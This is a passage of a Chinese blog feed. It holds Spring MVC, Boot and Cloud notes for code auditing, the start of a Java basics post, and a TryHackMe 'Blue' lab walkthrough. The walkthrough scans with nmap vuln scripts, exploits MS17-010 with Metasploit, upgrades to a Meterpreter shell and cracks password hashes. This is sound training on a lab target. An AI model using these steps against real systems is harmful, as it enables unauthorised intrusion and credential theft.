class="hljs-regexp">/web/</span>servlet/HandlerAdapter.java<br></code></pre></td></tr></table></figure><p>这三个组件共同协作，实现了请求的分发和处理。<code>DispatcherServlet</code> 充当总管，<code>HandlerMapping</code> 负责找到处理程序，而 <code>HandlerAdapter</code> 则负责调用实际的处理程序执行业务逻辑。这种设计使得 Spring MVC 具有灵活性，允许通过配置来适应不同的业务需求和处理程序类型。</p><blockquote><p>以上部分内容引用自下方链接，推荐大家拓展阅读</p><p><a href="https://pdai.tech/md/spring/spring-x-framework-springmvc.html">https://pdai.tech/md/spring/spring-x-framework-springmvc.html</a></p><p><a href="https://pdai.tech/files/kaitao-springMVC.pdf">https://pdai.tech/files/kaitao-springMVC.pdf</a></p></blockquote><h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>tee.com<span class="hljs-regexp">/huang_xiao_feng/</span>carrentalsystem<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605400.png" alt="image-20240416132652861"></p><p>首先注意，我们打开文件的时候要选择包含<strong>pom.xml</strong>的文件夹</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605107.png" alt="image-20240416133600921"></p><p>然后maven配置称自己电脑上的</p><p>导入之后我们看看pom.xml中是否有报错，如果有报红的，那就说明依赖还没有引入进来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605205.png" alt="image-20240416133120230"></p><p>然后就是看src文件中的文件，如果还是有.java后缀的就说明项目还没有被编译成功（如图所示就是编译成功的class文件）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605354.png" alt="image-20240416133855560"></p><p>然后我们在pom.xml中有一些报黄的，鼠标放上去就能自动显示这个版本的依赖有哪些漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605190.png" alt="image-20240416134040791"></p><p>在web.xml中我们可以看到请求路径的映射关系</p><p>我们那一段来进行简单分析</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605560.png" alt="image-20240416134509581"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springMvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springMvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里首先是可以看到</p><servlet><p>说明这是一个servlet</p><p>然后名称是</p><p>​    <servlet-name>springMvc</servlet-name></p><p>springMvc</p><p>然后对应的class是</p><p>org.springframework.web.servlet.DispatcherServlet</p><p>就是说请求的路径都可以交给这个DispatcherServlet处理</p><p>前面说到这个的作用就是分发、请求</p><p>然后一般是按照web.xml的配置顺序来执行的，但我们可以看到</p><p><load-on-startup>1</load-on-startup></p><p>这就让它可以在第一个执行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151605650.png" alt="image-20240416140617266"></p><p>然后再看这个springmvc.xml,是对springmvc的配置</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607619.png" alt="image-20240416141032992"></p><p>这个是数据库配置</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607891.png" alt="image-20240416141152651"></p><p>这个写具体代码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607072.png" alt="image-20240416141127852"></p><p>这个放一些静态文件</p><h1 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h1><p>SpringBoot是一款基于JAVA的开源框架。目的是为了简化Spring应用搭建和开发流程。</p><p>SpingBoot核心原理是自动装配</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>spring.io<span class="hljs-regexp">/projects/</span>spring-boot<br></code></pre></td></tr></table></figure><p> 创建项目</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607579.png" alt="image-20240416155307497"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607315.png" alt="image-20240416155335903"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607066.png" alt="image-20240416232904840"></p><p>点击运行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151607050.png" alt="image-20240416232920444"></p><p>就可以打开</p><p>接下来进行简单分析</p><p><code>@SpringBootApplication</code>注解表示这个类为 SpringBoot 的主配置类，SpringBoot 项目应运行这个类下面的 main 方法来启动 SpringBoot 应用。</p><p>也就是说这个 XXXApplication 是该项目的入口。</p><p>④、我们使用的是阿里云的脚手架创建的 SpringBoot 项目，可以看到在com\example\demo 目录下有个 demos\web 目录，里面是一些示例代码。如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608710.jpg" alt="helloworld代码"></p><p>⑦、点击右上方运行，或者进入 XXXApplication 中，点击左侧绿色小按钮，即刻运行项目，打开浏览器输入<code>http://127.0.0.1:8080/hello</code>，即可看到返回了一些内容，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608798.jpg" alt="返回helloworld"></p><p>⑧、下面我们进入 demos.web 目录下，看看他的 Controller 代码，也就是返回上面内容的接口代码，是位于该目录下的 BasicController，拿上述接口距离，访问 hello 会返回你输入的名字，默认值是 unkonown user，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608182.jpg"></p><p><strong>其他一些注解含义：</strong></p><p><code>@Controller</code>注解：标注该类为controller类，可以处理 http 请求。@Controller 一般要配合模版来使用。现在项目大多是前后端分离，后端处理请求，然后返回JSON格式数据即可，这样也就不需要模板了。</p><p><code>@ResponseBody</code>注解：将该注解写在类的外面，表示这个类所有方法的返回的数据直接给浏览器。<code> @RestController 相当于 @ResponseBody 加上 @Controller</code></p><p><code>@RequestMapping</code>注解：配置<code>URL映射</code>，可以作用于某个Controller类上，也可以作用于某Controller类下的具体方法中，说白了就是URL中请求路径会直接映射到具体方法中执行代码逻辑。</p><p><code>@PathVariable</code>注解：接受请求URL路径中占位符的值，示例代码如下图所示：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/hello&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/whoami/&#123;name&#125;/&#123;sex&#125;&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span>  <span class="hljs-title function_">hello</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;name&quot;</span>) <span class="hljs-built_in">String</span> name, <span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;sex&quot;</span>) <span class="hljs-built_in">String</span> sex</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span> + name + sex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>@RequestParam</code>注解：将请求参数绑定到你控制器的方法参数上（是springmvc中接收普通参数的注解），常用于POST请求处理表单。</p><p>综上演示，可以看到 Spring Boot 部署非常方便，并且在开发后端服务时也极大简化了各种配置，可以更专注于编写代码。这对于我们审计 Spring Boot 架构的系统也极为的便利。</p><h1 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h1><p>Spring Cloud 是一系列框架的有序集合。是一套基于 Spring Framework 的分布式系统开发工具，用于构建分布式应用程序中的各种模块化组件。</p><p>它利用 Spring Boot 的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用 Spring Boot 的开发风格做到一键启动和部署。</p><p>Spring Cloud 的诞生并不是为了解决微服务中的某一个问题，而是提供了一套解决微服务架构实施的综合性解决方案。</p><p>Spring Cloud 并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过 Spring Boot 风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p><p>大家也听过微服务吧。那它和 Spring Cloud 什么关系呢？</p><p>首先，什么是微服务？</p><p>微服务（英语：Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信。 </p><p>简单来说，微服务就是将一个大型的应用拆分成很多个小的应用，这些应用之间一般通过基于HTTP的RESTful API进行通信协作，并且能够各自进行独立部署以及伸缩。由于微服务独立部署，可伸缩的特性，它能够迅速地大规模部署到云服务器上。</p><p>而使用 Spring Cloud 能够快速实现微服务架构。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151608595.jpg" alt="7"></p><p>官方介绍：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>spring.io<span class="hljs-regexp">/projects/</span>spring-cloud<br></code></pre></td></tr></table></figure><p>Spring Cloud 提供了许多模块，以下是一些常用的模块及其主要作用：</p><p><strong>Spring Cloud Config（配置中心）：</strong></p><ul><li>作用：用于集中管理配置信息，可以将配置信息存储在版本控制系统中，并在需要时动态刷新。</li></ul><p><strong>Spring Cloud Netflix（服务治理）：</strong></p><ul><li>作用：整合了Netflix开发的一些组件，包括Eureka（服务注册与发现）、Ribbon（客户端负载均衡）、Hystrix（熔断器）、Feign（声明式REST客户端）等，用于构建具有高可用性和弹性的微服务架构。</li></ul><p><strong>Spring Cloud Bus（消息总线）：</strong></p><ul><li>作用：通过消息总线，实现微服务架构中配置的动态刷新，使得配置的修改能够快速传播到各个微服务实例。</li></ul><p><strong>Spring Cloud Sleuth（分布式追踪）：</strong></p><ul><li>作用：用于跟踪分布式系统中的请求流程，生成跨服务的唯一标识，方便在分布式系统中进行日志跟踪和性能监控。</li></ul><p><strong>Spring Cloud Gateway（网关）：</strong></p><ul><li>作用：提供了一种简单而有效的方式来进行路由、过滤以及转发请求，用于构建微服务架构中的API网关。</li></ul><p><strong>Spring Cloud Stream（消息驱动）：</strong></p><ul><li>作用：简化了消息驱动的微服务开发，提供了一套统一的编程模型，支持多种消息中间件。</li></ul><p><strong>Spring Cloud Security（安全）：</strong></p><ul><li>作用：提供了一些安全工具和特性，用于保护分布式系统中的微服务。</li></ul><p><strong>Spring Cloud Data Flow（数据流）：</strong></p><ul><li>作用：用于构建和部署实时数据处理和分析的微服务，支持复杂的数据流操作。</li></ul><p><strong>Spring Cloud OpenFeign（声明式REST客户端）：</strong></p><ul><li>作用：简化了微服务之间的REST调用，通过声明式的方式定义和调用服务接口。</li></ul><p><strong>Spring Cloud Task（任务调度）：</strong></p><ul><li>作用：用于简化任务调度和执行，支持在分布式环境中进行批处理任务的调度和执行。</li></ul><p>若依微服务版本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>tee.com<span class="hljs-regexp">/y_project/</span>RuoYi-Cloud<br></code></pre></td></tr></table></figure><h1 id="JAVA分层思想与MVC模式"><a href="#JAVA分层思想与MVC模式" class="headerlink" title="JAVA分层思想与MVC模式"></a>JAVA分层思想与MVC模式</h1><h2 id="1、分层讲解"><a href="#1、分层讲解" class="headerlink" title="1、分层讲解"></a>1、分层讲解</h2><p>Java 分层思想是一种软件架构设计理念，旨在将一个复杂的系统划分为多个相对独立且互相关联的层次，每个层次负责不同的功能，以实现高内聚、低耦合的设计。这种思想有助于提高代码的可维护性、可扩展性，并使团队更容易协同工作。以下是Java分层思想的主要层次：</p><p><strong>表现层（Presentation Layer）：</strong> 主要负责与用户交互，处理用户界面和用户输入输出。在 Java 中，通常由 Servlet、JSP、或者更现代的框架如 Spring MVC 负责、或者 Springboot 下的 Controller 层。</p><p><strong>业务层（Business Layer）：</strong> 业务层包含应用程序的业务逻辑，处理业务规则和数据处理。这一层通常由 JavaBean、Service 等组成，负责执行具体的业务操作。</p><p><strong>服务层（Service Layer）：</strong> 服务层是业务层的一部分，提供业务逻辑的具体实现。在 Spring 框架中，使用 @Service 注解来表示服务层。</p><p><strong>持久层（Persistence Layer）：</strong> 持久层负责数据的持久化，通常与数据库交互。在 Java 中，常见的持久层技术包括 JDBC、Hibernate、MyBatis 等。</p><p><strong>数据访问层（Data Access Layer）：</strong> 这一层是持久层的一部分，负责封装数据访问细节，提供统一的接口给业务层。通常由 DAO（Data Access Object）组成。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611117.png" alt="Java分层"></p><p>通过明确划分这些层次，开发人员可以更容易地理解、维护和扩展代码。这种分层思想还有助于实现模块化开发，每个层次都可以独立测试和替换，从而提高系统的可测试性和灵活性。在实际应用中，可以根据项目的规模和需求进行适度的调整和扩展。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://www.cnblogs.com/java-<span class="hljs-number">123</span>/p/<span class="hljs-number">9174547</span>.html<br></code></pre></td></tr></table></figure><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>老规矩，看pom.xml</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611136.png" alt="image-20240418124124507"></p><p>看看有没有报红的地方，那里可能依赖还没有缓存好（刚打开要先等等）</p><p>再看看rbac.sql</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611122.png" alt="image-20240418124136004"></p><p>把它导入到我们的数据库中</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611131.png" alt="image-20240418124632503"></p><p>首先我们可以看到数据库名称是rbac</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611148.png" alt="image-20240418124824388"></p><p>我们也创建一个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611152.png" alt="image-20240418124949474"></p><p>然后再导入（<strong>注意这里不用加分号</strong>）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611344.png" alt="image-20240418125147945"></p><p>还是刚才application.yml那，记得改账号密码</p><p>然后开始看分层</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611365.png" alt="image-20240418125925091"></p><p><code>annotation</code>：放置项目自定义注解</p><p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p><p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p><p><code>entity/</code>: 存放实体类</p><p><code>interceptor/</code>: 拦截器</p><p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p><p><code>utils/</code>: 存放工具类</p><p><code>dto/</code>: 存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p><p><code>vo/</code>: 视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p><p><code>constant/</code>: 存放常量</p><p><code>filter/</code>: 存放过滤器 </p><h3 id="resources-目录"><a href="#resources-目录" class="headerlink" title="resources 目录"></a>resources 目录</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406151611387.png" alt="image-20240418141440412"></p><p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p><p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p><p><code>templates/</code>: 存放模版文件</p><p><code>application.properties</code>或<code>application.yml</code>: Spring Boot默认配置文件</p><h1 id="Java-MVC-模式"><a href="#Java-MVC-模式" class="headerlink" title="Java MVC 模式"></a>Java MVC 模式</h1><h2 id="1、模式讲解"><a href="#1、模式讲解" class="headerlink" title="1、模式讲解"></a>1、模式讲解</h2><p>MVC 即模型（Model） 、视图（View）、控制器（Controller）。</p><p>MVC（Model-View-Controller）是一种软件架构模式，用于设计和组织代码。它将一个应用程序分为三个主要组件：模型（Model）、视图（View）和控制器（Controller）。每个组件有不同的责任，以实现代码的分离和模块化，以便更容易维护和扩展应用程序。</p><p>通俗来说，各司其职高效完成任务。</p><ul><li>模型（Model）</li></ul><p>模型是用于处理数据逻辑的部分。</p><p>所谓数据逻辑，也就是数据的映射以及对数据的增删改查，Bean、DAO（data access object，数据访问对象）等都属于模型部分。</p><ul><li>视图（View）</li></ul><p>视图负责数据与其它信息的显示，也就是给用户看到的页面。</p><p>html、JSP 等页面都可以作为视图。</p><ul><li>控制器（controller）</li></ul><p>控制器是模型与视图之间的桥梁，控制着数据与用户的交互。</p><p>控制器通常负责从视图读取数据，处理用户输入，并向模型发送数据，也可以从模型中读取数据，再发送给视图，由视图显示。</p></servlet>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY2-Blue</title>
    <link href="/2024/06/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY2-Blue/"/>
    <url>/2024/06/15/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY2-Blue/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY2-Blue"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY2-Blue" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY2-Blue"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY2-Blue</h1><p><a href="https://tryhackme.com/room/blue#">TryHackMe的 |蓝 — TryHackMe | Blue</a>（永恒之蓝，比较经典的靶场了）</p><p><a href="https://baike.baidu.com/item/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/4951714">永恒之蓝_百度百科 (baidu.com)</a></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508948.png" alt="image-20240313215638733"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508422.png" alt="image-20240313220456332"></p><p>-sV 版本探测<br>-vv 对结果的详细输出<br>–script 指定使用的nmap脚本，可以理解为插件，这里使用的是vuln脚本，负责检查目标机是否有常见的漏洞</p><p>(这里不知道为什么虚拟机里的kali死活扫不出结果，所以用了thm的机子，用xshell连上使用)</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508717.png" alt="image-20240313221806431"></p><p>这是扫描出来的结果</p><p>第二个问题答案显而易见，3个</p><p>第三个问题也可以看见 ms17-010（永恒之蓝）</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里的知识点主要是对nmap插件的使用，对一些常见漏洞的识别</p><p>–script vuln</p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508670.png" alt="image-20240313222107661"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141508343.png" alt="image-20240313222320863"></p><p>msfconsole</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509162.png" alt="image-20240313222354486"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509398.png" alt="image-20240313222827467"></p><p>0是我们需要的载荷，win7永恒之蓝</p><p>1是永恒浪漫，也是ms17-010的利用方式，具体区别可以自行百度</p><p>2和3 是auxiliary模块，即测试模块，测试是否可以利用该漏洞</p><p>4是DoublePulsar双脉冲星，nsa武器库之一</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509092.png" alt="image-20240313223421432"></p><p>RHOSTS是空的，可见结果是RHOSTS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509241.png" alt="image-20240313225624227"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509833.png" alt="image-20240313230137583"></p><p>这里记得设置我们的rhosts为目标靶机ip</p><p>然后run</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509390.png" alt="image-20240313230924386"></p><p>我们成功连接到目标靶机</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>Metasploit的基本使用</p><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">【工具使用】——Metasploit(MSF)使用详解(超详细)-CSDN博客</a></p><p>可以看看别人的文章多学点</p><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>第三个任务是提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509053.png" alt="image-20240313231109272"></p><p>看看任务清单</p><p>问题一：<a href="https://blog.csdn.net/weixin_43379478/article/details/85720083">Metasploit中将shell升级为metepreter shell_metasploit 标准shell 升级到完整shell-CSDN博客</a></p><p>post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</p><p>问题二我直接跟着上面做了，没留意还要看我们要改哪个选项，提前改成了session 1，正常来说这里session那里应该是空着的</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509017.png" alt="image-20240313233149512"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509421.png" alt="image-20240313233401446"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509246.png" alt="image-20240313233508847"></p><p>介绍另外一种方法，我们其实可以简单的通过<code>sessions -u TARGET_ID</code>就可以将普通cmdshell升级成msfshell了，它的效果和我们上述的效果是一样的，但是在渗透测试类的比赛中很实用，速度很快。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509144.png" alt="image-20240313233650302"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509430.png" alt="image-20240313233814989"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509778.png" alt="image-20240313233918197"></p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>跟上一个差不多，仍是metasploit的使用，这个是提权</p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>我们的任务是破解密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141509030.png" alt="image-20240313234049777"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510706.png" alt="image-20240313234038667"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510935.png" alt="image-20240313234322560"></p><p>真服了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510073.png" alt="image-20240313234610191"></p><p>找了个别的网站</p><p><a href="https://hashes.com/zh/decrypt/hash">MD5 在線免費解密 MD5、SHA1、MySQL、NTLM、SHA256、SHA512、Wordpress、Bcrypt 的雜湊 (hashes.com)</a></p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>简单的密码破解</p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>找flag，熟悉，太熟悉了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510869.png" alt="image-20240313234842495"></p><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510183.png" alt="image-20240313235029197"></p><p>好吧也没这么熟，win的一些指令还是不记得</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141510119.png" alt="image-20240313235227106"></p><p>他这里删除键什么的用不了不知道为什么</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141511119.png" alt="image-20240313235453118"></p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>这里很明显对windows命令的不熟悉，还得练</p><p><a href="https://zhuanlan.zhihu.com/p/468515490">Windows CMD常用命令大全（值得收藏） - 知乎 (zhihu.com)</a></p><p>也挂上一个链接（都是百度搜到的第一个）</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p><a href="https://blog.csdn.net/qq_25755011/article/details/113663910">TryHackMe | Blue Writeup （超干货详细msf渗透使用指南）-CSDN博客</a>（个人感觉写的真的非常详细了）</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础</title>
    <link href="/2024/06/14/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/06/14/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA基础"><a href="#JAVA基础" class="headerlink" title="JAVA基础"></a>JAVA基础</h1><h2 id="1-项目搭建"><a href="#1-项目搭建" class="headerlink" title="1.项目搭建"></a>1.项目搭建</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121720.png" alt="image-20240409203002258"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121467.png" alt="image-20240409203045634"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121615.png" alt="image-20240409203249150"></p><h2 id="2-常见关键字"><a href="#2-常见关键字" class="headerlink" title="2.常见关键字"></a>2.常见关键字</h2><p>Java 关键字是对 Java编译器有特殊含义的字符串，是编译器和程序员的一个约定，程序员利用关键字来告诉编译器其声明的变量类型、类、方法特性等信息。</p><table><thead><tr><th align="center">关键字</th><th align="center">关键字</th><th align="center">关键字</th><th align="center">关键字</th></tr></thead><tbody><tr><td 